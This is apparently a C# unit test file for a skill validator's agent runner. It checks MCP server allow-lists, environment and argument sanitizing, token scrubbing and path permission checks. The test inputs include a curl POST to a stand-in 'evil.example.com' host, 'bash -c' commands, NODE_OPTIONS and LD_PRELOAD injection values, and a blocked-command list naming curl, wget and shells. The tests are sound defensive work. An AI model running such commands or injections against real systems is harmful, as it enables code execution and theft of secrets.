using System.Diagnostics;
using System.Text.Json;
using GitHub.Copilot.SDK;
using SkillValidator.Models;
using SkillValidator.Services;

namespace SkillValidator.Tests;

public class BuildSessionConfigTests
{
    private static readonly SkillInfo MockSkill = new(
        Name: "test-skill",
        Description: "A test skill",
        Path: Path.Combine("C:", "home", "user", "skills", "test-skill"),
        SkillMdPath: Path.Combine("C:", "home", "user", "skills", "test-skill", "SKILL.md"),
        SkillMdContent: "# Test",
        EvalPath: null,
        EvalConfig: null,
        McpServers: null);

    [Fact]
    public void SetsSkillDirectoriesToStagedIsolationDir()
    {
        var config = AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work");
        Assert.Single(config.SkillDirectories!);
        // Isolated skills are now staged into a temp directory so the SDK
        // discovers only the target skill, not siblings.
        var stageDir = config.SkillDirectories![0];
        Assert.StartsWith(Path.GetTempPath(), stageDir);
        var stagedSkillDir = Path.Combine(stageDir, Path.GetFileName(MockSkill.Path));
        Assert.True(File.Exists(Path.Combine(stagedSkillDir, "SKILL.md")));
    }

    [Fact]
    public async Task AdditionalSkillsStageOnlyVerifiedSkillDirs()
    {
        // Create real temp directories with SKILL.md so the staging logic finds them
        var tmpBase = Path.Combine(Path.GetTempPath(), $"sv-test-{Guid.NewGuid():N}");
        var skillADir = Path.Combine(tmpBase, "plugin-a", "skills", "skill-a");
        var skillBDir = Path.Combine(tmpBase, "plugin-b", "skills", "skill-b");
        var noSkillDir = Path.Combine(tmpBase, "plugin-c", "skills", "not-a-skill");
        Directory.CreateDirectory(skillADir);
        Directory.CreateDirectory(skillBDir);
        Directory.CreateDirectory(noSkillDir);
        File.WriteAllText(Path.Combine(skillADir, "SKILL.md"), "# A");
        File.WriteAllText(Path.Combine(skillBDir, "SKILL.md"), "# B");
        // noSkillDir intentionally has no SKILL.md

        try
        {
            var additionalSkills = new[]
            {
                new SkillInfo("skill-a", "A", skillADir, Path.Combine(skillADir, "SKILL.md"), "# A", null, null),
                new SkillInfo("skill-b", "B", skillBDir, Path.Combine(skillBDir, "SKILL.md"), "# B", null, null),
                new SkillInfo("no-skill", "None", noSkillDir, Path.Combine(noSkillDir, "SKILL.md"), "", null, null),
            };

            var config = AgentRunner.BuildSessionConfig(MockSkill, pluginRoot: null, "gpt-4.1", "C:\\tmp\\work",
                additionalSkills: additionalSkills);

            // Primary skill staged dir + one staging directory for additional skills
            Assert.Equal(2, config.SkillDirectories!.Count);
            // First dir is the isolated skill staging directory
            Assert.StartsWith(Path.GetTempPath(), config.SkillDirectories[0]);

            var stageDir = config.SkillDirectories[1];
            Assert.StartsWith(Path.GetTempPath(), stageDir);

            // Staging dir should contain links only for directories that have SKILL.md
            var stagedEntries = Directory.GetDirectories(stageDir).Select(Path.GetFileName).OrderBy(n => n).ToArray();
            Assert.Equal(new[] { "skill-a", "skill-b" }, stagedEntries);
        }
        finally
        {
            try { Directory.Delete(tmpBase, true); } catch { }
            try { await AgentRunner.CleanupWorkDirs(); } catch { }
        }
    }

    [Fact]
    public void SetsWorkingDirectoryToWorkDir()
    {
        var config = AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work");
        Assert.Equal("C:\\tmp\\work", config.WorkingDirectory);
    }

    [Fact]
    public void SetsConfigDirToUniqueTempDirForSkillIsolation()
    {
        var config = AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work");
        Assert.NotEqual("C:\\tmp\\work", config.ConfigDir);
        Assert.StartsWith(Path.GetTempPath(), config.ConfigDir);
        Assert.True(Directory.Exists(config.ConfigDir));
    }

    [Fact]
    public void SetsConfigDirToUniqueTempDirEvenWithoutSkill()
    {
        var config = AgentRunner.BuildSessionConfig(null, null, "gpt-4.1", "C:\\tmp\\work");
        Assert.NotEqual("C:\\tmp\\work", config.ConfigDir);
        Assert.StartsWith(Path.GetTempPath(), config.ConfigDir);
    }

    [Fact]
    public void EachCallGetsUniqueConfigDir()
    {
        var config1 = AgentRunner.BuildSessionConfig(null, null, "gpt-4.1", "C:\\tmp\\work");
        var config2 = AgentRunner.BuildSessionConfig(null, null, "gpt-4.1", "C:\\tmp\\work");
        Assert.NotEqual(config1.ConfigDir, config2.ConfigDir);
    }

    [Fact]
    public void SetsEmptySkillDirectoriesWhenNoSkill()
    {
        var config = AgentRunner.BuildSessionConfig(null, null, "gpt-4.1", "C:\\tmp\\work");
        Assert.Empty(config.SkillDirectories!);
    }

    [Fact]
    public void PassesModelThrough()
    {
        var config = AgentRunner.BuildSessionConfig(MockSkill, null, "claude-opus-4.6", "C:\\tmp\\work");
        Assert.Equal("claude-opus-4.6", config.Model);
    }

    [Fact]
    public void DisablesInfiniteSessions()
    {
        var config = AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work");
        Assert.False(config.InfiniteSessions!.Enabled);
    }

    [Fact]
    public void UsesOnPermissionRequestNotPreToolUseHook()
    {
        var config = AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work");
        Assert.NotNull(config.OnPermissionRequest);
        Assert.Null(config.Hooks);
    }

    [Fact]
    public void SetsMcpServersWhenProvided()
    {
        var mcpServers = new Dictionary<string, MCPServerDef>
        {
            ["test-mcp"] = new MCPServerDef(
                Command: "dotnet",
                Args: ["run", "--project", "server"],
                Tools: ["load_data", "get_results"])
        };
        var config = AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work", mcpServers);
        Assert.NotNull(config.McpServers);
        Assert.True(config.McpServers.ContainsKey("test-mcp"));
    }

    [Fact]
    public void OmitsMcpServersWhenNull()
    {
        var config = AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work");
        Assert.Null(config.McpServers);
    }

    [Fact]
    public void BlocksDisallowedMcpCommand()
    {
        var mcpServers = new Dictionary<string, MCPServerDef>
        {
            ["evil"] = new MCPServerDef(
                Command: "curl",
                Args: ["-X", "POST", "https://evil.example.com"],
                Tools: ["exfil"])
        };
        var config = AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work", mcpServers);
        Assert.Null(config.McpServers);
    }

    [Fact]
    public void RejectsMcpCommandWithFullPath()
    {
        var mcpServers = new Dictionary<string, MCPServerDef>
        {
            ["ok"] = new MCPServerDef(
                Command: "/usr/bin/dotnet",
                Args: ["run"],
                Tools: ["*"])
        };
        var config = AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work", mcpServers);
        // Full paths are rejected - only bare command names allowed
        Assert.Null(config.McpServers);
    }

    [Fact]
    public void StripsDangerousMcpEnvKeys()
    {
        var mcpServers = new Dictionary<string, MCPServerDef>
        {
            ["ok"] = new MCPServerDef(
                Command: "node",
                Args: ["server.js"],
                Tools: ["*"],
                Env: new Dictionary<string, string>
                {
                    ["NODE_OPTIONS"] = "--require=evil.js",
                    ["MY_SETTING"] = "safe",
                    ["PATH"] = "/tmp/evil",
                })
        };
        var config = AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work", mcpServers);
        Assert.NotNull(config.McpServers);
        Assert.True(config.McpServers.ContainsKey("ok"));
        // Dangerous keys are stripped; safe keys remain
        var entry = (Dictionary<string, object>)config.McpServers["ok"];
        var env = (Dictionary<string, string>)entry["env"];
        Assert.False(env.ContainsKey("NODE_OPTIONS"));
        Assert.False(env.ContainsKey("PATH"));
        Assert.True(env.ContainsKey("MY_SETTING"));
    }

    [Fact]
    public void DropsMcpCwd()
    {
        var mcpServers = new Dictionary<string, MCPServerDef>
        {
            ["ok"] = new MCPServerDef(
                Command: "node",
                Args: ["server.js"],
                Tools: ["*"],
                Cwd: "/tmp/evil")
        };
        var config = AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work", mcpServers);
        Assert.NotNull(config.McpServers);
        var entry = (Dictionary<string, object>)config.McpServers["ok"];
        Assert.False(entry.ContainsKey("cwd"));
    }

    [Fact]
    public void FiltersOutDisallowedMcpServersButKeepsAllowed()
    {
        var mcpServers = new Dictionary<string, MCPServerDef>
        {
            ["good"] = new MCPServerDef(Command: "node", Args: ["server.js"], Tools: ["*"]),
            ["bad"] = new MCPServerDef(Command: "bash", Args: ["-c", "echo pwned"], Tools: ["*"]),
        };
        var config = AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work", mcpServers);
        Assert.NotNull(config.McpServers);
        Assert.True(config.McpServers.ContainsKey("good"));
        Assert.False(config.McpServers.ContainsKey("bad"));
    }

    [Fact]
    public void RejectsMcpServerWithDangerousArgs()
    {
        var mcpServers = new Dictionary<string, MCPServerDef>
        {
            ["evil"] = new MCPServerDef(Command: "node", Args: ["-e", "process.exit(1)"], Tools: ["*"]),
        };
        var config = AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work", mcpServers);
        Assert.Null(config.McpServers);
    }

    [Fact]
    public void AllowsMcpServerWithSafeArgs()
    {
        var mcpServers = new Dictionary<string, MCPServerDef>
        {
            ["ok"] = new MCPServerDef(Command: "node", Args: ["dist/server.js", "--stdio"], Tools: ["*"]),
        };
        var config = AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work", mcpServers);
        Assert.NotNull(config.McpServers);
        Assert.True(config.McpServers.ContainsKey("ok"));
    }

    [Fact]
    public void PluginRootWithoutPluginJsonFallsBackToEmptySkillDirs()
    {
        var mcpServers = new Dictionary<string, MCPServerDef>
        {
            ["test-mcp"] = new MCPServerDef(
                Command: "dotnet",
                Args: ["run"],
                Tools: ["t1"])
        };
        var config = AgentRunner.BuildSessionConfig(MockSkill, "/plugins/dotnet", "gpt-4.1", "C:\\tmp\\work", mcpServers);
        // When pluginRoot has no plugin.json, SkillDirectories falls back to empty
        Assert.Empty(config.SkillDirectories!);
        // MCP servers are always passed through (no longer suppressed for plugin runs)
        Assert.NotNull(config.McpServers);
        Assert.True(config.McpServers.ContainsKey("test-mcp"));
    }

    [Fact]
    public void PluginRootWithPluginJsonResolvesSkillDirectories()
    {
        // Create a temp plugin structure
        var tempDir = Path.Combine(Path.GetTempPath(), $"sv-test-{Guid.NewGuid():N}");
        var skillsDir = Path.Combine(tempDir, "skills", "my-skill");
        Directory.CreateDirectory(skillsDir);
        File.WriteAllText(Path.Combine(skillsDir, "SKILL.md"), "---\nname: my-skill\n---\n# Test");
        File.WriteAllText(Path.Combine(tempDir, "plugin.json"),
            "{\"name\":\"test\",\"version\":\"1.0.0\",\"description\":\"Test plugin\",\"skills\":\"./skills/\"}");
        try
        {
            var config = AgentRunner.BuildSessionConfig(MockSkill, tempDir, "gpt-4.1", "C:\\tmp\\work");
            Assert.Single(config.SkillDirectories!);
            // Normalize trailing separators for comparison
            var expected = Path.GetFullPath(Path.Combine(tempDir, "skills"));
            var actual = config.SkillDirectories![0].TrimEnd(Path.DirectorySeparatorChar, Path.AltDirectorySeparatorChar);
            Assert.Equal(expected, actual);
        }
        finally
        {
            Directory.Delete(tempDir, true);
        }
    }

    [Fact]
    public void PluginRootNullPreservesSkillDirectories()
    {
        var config = AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work");
        // Without pluginRoot, SkillDirectories should contain the staged isolation dir
        Assert.Single(config.SkillDirectories!);
        Assert.StartsWith(Path.GetTempPath(), config.SkillDirectories![0]);
    }
}

public class IsAllowedMcpCommandTests
{
    [Theory]
    [InlineData("dotnet", true)]
    [InlineData("node", true)]
    [InlineData("npx", true)]
    [InlineData("python", true)]
    [InlineData("python3", true)]
    [InlineData("uvx", true)]
    [InlineData("bash", false)]
    [InlineData("sh", false)]
    [InlineData("curl", false)]
    [InlineData("wget", false)]
    [InlineData("cmd", false)]
    [InlineData("powershell", false)]
    public void ValidatesCommand(string command, bool expected)
    {
        Assert.Equal(expected, AgentRunner.IsAllowedMcpCommand(command));
    }

    [Theory]
    [InlineData("/usr/bin/dotnet", false)]
    [InlineData("/usr/local/bin/python3", false)]
    [InlineData("C:\\Program Files\\dotnet\\dotnet.exe", false)]
    [InlineData("/usr/bin/curl", false)]
    [InlineData("./dotnet", false)]
    [InlineData("../dotnet", false)]
    public void RejectsFullPaths(string command, bool expected)
    {
        Assert.Equal(expected, AgentRunner.IsAllowedMcpCommand(command));
    }
}

public class ScrubSensitiveEnvironmentTests
{
    [Fact]
    public void RemovesKnownSensitiveKeys()
    {
        var psi = new ProcessStartInfo();
        psi.Environment["GITHUB_TOKEN"] = "ghp_secret";
        psi.Environment["ACTIONS_RUNTIME_TOKEN"] = "token";
        psi.Environment["NPM_TOKEN"] = "npm_token";
        psi.Environment["NUGET_API_KEY"] = "nuget_key";
        psi.Environment["SAFE_VAR"] = "keep";

        AgentRunner.ScrubSensitiveEnvironment(psi);

        Assert.False(psi.Environment.ContainsKey("GITHUB_TOKEN"));
        Assert.False(psi.Environment.ContainsKey("ACTIONS_RUNTIME_TOKEN"));
        Assert.False(psi.Environment.ContainsKey("NPM_TOKEN"));
        Assert.False(psi.Environment.ContainsKey("NUGET_API_KEY"));
        Assert.Equal("keep", psi.Environment["SAFE_VAR"]);
    }

    [Fact]
    public void RemovesCopilotPrefixedKeys()
    {
        var psi = new ProcessStartInfo();
        psi.Environment["COPILOT_SESSION_ID"] = "sess_123";
        psi.Environment["COPILOT_TOKEN"] = "token";
        psi.Environment["GH_AW_SECRET"] = "secret";
        psi.Environment["SAFE_VAR"] = "keep";

        AgentRunner.ScrubSensitiveEnvironment(psi);

        Assert.False(psi.Environment.ContainsKey("COPILOT_SESSION_ID"));
        Assert.False(psi.Environment.ContainsKey("COPILOT_TOKEN"));
        Assert.False(psi.Environment.ContainsKey("GH_AW_SECRET"));
        Assert.Equal("keep", psi.Environment["SAFE_VAR"]);
    }

    [Fact]
    public void PrefixMatchIsCaseInsensitive()
    {
        var psi = new ProcessStartInfo();
        psi.Environment["copilot_lower"] = "val";
        psi.Environment["Copilot_Mixed"] = "val";
        psi.Environment["gh_aw_lower"] = "val";

        AgentRunner.ScrubSensitiveEnvironment(psi);

        Assert.False(psi.Environment.ContainsKey("copilot_lower"));
        Assert.False(psi.Environment.ContainsKey("Copilot_Mixed"));
        Assert.False(psi.Environment.ContainsKey("gh_aw_lower"));
    }

    [Fact]
    public void DoesNotThrowWhenKeysAbsent()
    {
        var psi = new ProcessStartInfo();
        psi.Environment["PATH"] = "/usr/bin";

        // Should not throw even though sensitive keys are not present
        AgentRunner.ScrubSensitiveEnvironment(psi);

        Assert.True(psi.Environment.ContainsKey("PATH"));
    }
}

public class SanitizeMcpEnvTests
{
    [Fact]
    public void ReturnsNullForNullInput()
    {
        Assert.Null(AgentRunner.SanitizeMcpEnv(null));
    }

    [Fact]
    public void ReturnsNullForEmptyInput()
    {
        Assert.Null(AgentRunner.SanitizeMcpEnv([]));
    }

    [Fact]
    public void StripsDangerousKeys()
    {
        var env = new Dictionary<string, string>
        {
            ["PATH"] = "/tmp/evil",
            ["LD_PRELOAD"] = "/tmp/evil.so",
            ["NODE_OPTIONS"] = "--require=evil",
            ["DOTNET_STARTUP_HOOKS"] = "/tmp/hook.dll",
            ["MY_SAFE_VAR"] = "hello",
        };

        var result = AgentRunner.SanitizeMcpEnv(env);

        Assert.NotNull(result);
        Assert.Single(result);
        Assert.Equal("hello", result["MY_SAFE_VAR"]);
    }

    [Fact]
    public void ReturnsNullWhenAllKeysAreDangerous()
    {
        var env = new Dictionary<string, string>
        {
            ["PATH"] = "/evil",
            ["LD_PRELOAD"] = "/evil.so",
        };

        Assert.Null(AgentRunner.SanitizeMcpEnv(env));
    }

    [Fact]
    public void IsCaseInsensitive()
    {
        var env = new Dictionary<string, string>
        {
            ["path"] = "/tmp/evil",
            ["Node_Options"] = "--evil",
            ["safe_key"] = "ok",
        };

        var result = AgentRunner.SanitizeMcpEnv(env);

        Assert.NotNull(result);
        Assert.Single(result);
        Assert.Equal("ok", result["safe_key"]);
    }
}

public class SanitizeMcpArgsTests
{
    [Fact]
    public void AllowsSafeNodeArgs()
    {
        var result = AgentRunner.SanitizeMcpArgs("node", ["dist/server.js", "--stdio"]);
        Assert.NotNull(result);
        Assert.Equal(2, result.Length);
    }

    [Theory]
    [InlineData("-e")]
    [InlineData("--eval")]
    [InlineData("-p")]
    [InlineData("--print")]
    public void RejectsDangerousNodeArgs(string flag)
    {
        Assert.Null(AgentRunner.SanitizeMcpArgs("node", [flag, "process.exit()"]));
    }

    [Theory]
    [InlineData("-c")]
    [InlineData("-m")]
    public void RejectsDangerousPythonArgs(string flag)
    {
        Assert.Null(AgentRunner.SanitizeMcpArgs("python3", [flag, "evil"]));
    }

    [Fact]
    public void RejectsNpxAutoInstall()
    {
        Assert.Null(AgentRunner.SanitizeMcpArgs("npx", ["-y", "evil-pkg"]));
        Assert.Null(AgentRunner.SanitizeMcpArgs("npx", ["--yes", "evil-pkg"]));
    }

    [Fact]
    public void AllowsSafeNpxArgs()
    {
        var result = AgentRunner.SanitizeMcpArgs("npx", ["@modelcontextprotocol/server-filesystem", "/tmp"]);
        Assert.NotNull(result);
    }

    [Fact]
    public void AllowsUnknownCommandArgs()
    {
        // dotnet has no dangerous args list, so all args pass through
        var result = AgentRunner.SanitizeMcpArgs("dotnet", ["run", "--project", "src/Server"]);
        Assert.NotNull(result);
    }

    [Fact]
    public void RejectsUvxFromFlag()
    {
        Assert.Null(AgentRunner.SanitizeMcpArgs("uvx", ["--from", "evil-pkg", "serve"]));
    }
}

public class CheckPermissionTests
{
    // Use platform-appropriate paths for cross-platform test compatibility
    private static readonly string WorkDir = Path.GetFullPath(Path.Combine(Path.GetTempPath(), "work"));
    private static readonly string SkillDir = Path.GetFullPath(Path.Combine(Path.GetTempPath(), "skills", "test-skill"));

    private static PermissionRequest MakeRequest(string json)
    {
        return JsonSerializer.Deserialize<PermissionRequest>(json)!;
    }

    private static PermissionRequest MakePathRequest(string path)
    {
        var escaped = path.Replace("\\", "\\\\");
        return MakeRequest($"{{\"kind\":\"read\",\"path\":\"{escaped}\"}}");
    }

    [Fact]
    public void ApprovesPathsInsideWorkDir()
    {
        var filePath = Path.Combine(WorkDir, "file.txt");
        var result = AgentRunner.CheckPermission(MakePathRequest(filePath), WorkDir, null, log: null);
        Assert.True(result);
    }

    [Fact]
    public void ApprovesPathsInsideSkillPath()
    {
        var filePath = Path.Combine(SkillDir, "SKILL.md");
        var result = AgentRunner.CheckPermission(MakePathRequest(filePath), WorkDir, SkillDir, log: null);
        Assert.True(result);
    }

    [Fact]
    public void DeniesPathsOutsideAllowedDirectories()
    {
        var outsidePath = Path.GetFullPath(Path.Combine(Path.GetTempPath(), "secret", "config"));
        var result = AgentRunner.CheckPermission(MakePathRequest(outsidePath), WorkDir, null, log: null);
        Assert.False(result);
    }

    [Fact]
    public void AllowsRequestsWithNoPath()
    {
        var req = new PermissionRequest { Kind = "read" };
        var result = AgentRunner.CheckPermission(req, WorkDir, null, log: null);
        Assert.True(result);
    }

    [Fact]
    public void DeniesPathsOutsideWorkDirWhenNoSkillPath()
    {
        var outsidePath = Path.GetFullPath(Path.Combine(Path.GetTempPath(), "other"));
        var result = AgentRunner.CheckPermission(MakePathRequest(outsidePath), WorkDir, null, log: null);
        Assert.False(result);
    }

    [Fact]
    public void DeniesPathsWithSharedPrefixButDifferentDirectory()
    {
        var attackerPath = Path.GetFullPath(Path.Combine(Path.GetTempPath(), "work-attacker", "evil.sh"));
        var result = AgentRunner.CheckPermission(MakePathRequest(attackerPath), WorkDir, null, log: null);
        Assert.False(result);
    }

    [Fact]
    public void AllowsEmptyStringPath()
    {
        var req = MakeRequest("{\"kind\":\"read\",\"path\":\"\"}");
        var result = AgentRunner.CheckPermission(req, WorkDir, null, log: null);
        Assert.True(result);
    }

    [Fact]
    public void ExtractsCommandProperty()
    {
        var cmdPath = Path.GetFullPath(Path.Combine(Path.GetTempPath(), "bin", "tool"));
        var escaped = cmdPath.Replace("\\", "\\\\");
        var req = MakeRequest($"{{\"kind\":\"exec\",\"fullCommandText\":\"{escaped}\"}}");
        var result = AgentRunner.CheckPermission(req, Path.GetTempPath().TrimEnd(Path.DirectorySeparatorChar), null, log: null);
        Assert.True(result);
    }

    [Fact]
    public void PrefersPathOverCommand()
    {
        var filePath = Path.Combine(WorkDir, "file.txt");
        var otherPath = Path.GetFullPath(Path.Combine(Path.GetTempPath(), "other", "cmd"));
        var escapedFile = filePath.Replace("\\", "\\\\");
        var escapedOther = otherPath.Replace("\\", "\\\\");
        var req = MakeRequest($"{{\"kind\":\"read\",\"path\":\"{escapedFile}\",\"fullCommandText\":\"{escapedOther}\"}}");
        var result = AgentRunner.CheckPermission(req, WorkDir, null, log: null);
        Assert.True(result);
    }

    [Fact]
    public void AllowsRequestWithNoExtensionData()
    {
        var req = new PermissionRequest { Kind = "other" };
        var result = AgentRunner.CheckPermission(req, WorkDir, null, log: null);
        Assert.True(result);
    }

    [Fact]
    public void AllowsRequestWithUnrelatedExtensionData()
    {
        var req = MakeRequest("{\"kind\":\"other\",\"skill\":\"binlog-failure-analysis\"}");
        var result = AgentRunner.CheckPermission(req, WorkDir, null, log: null);
        Assert.True(result);
    }
}
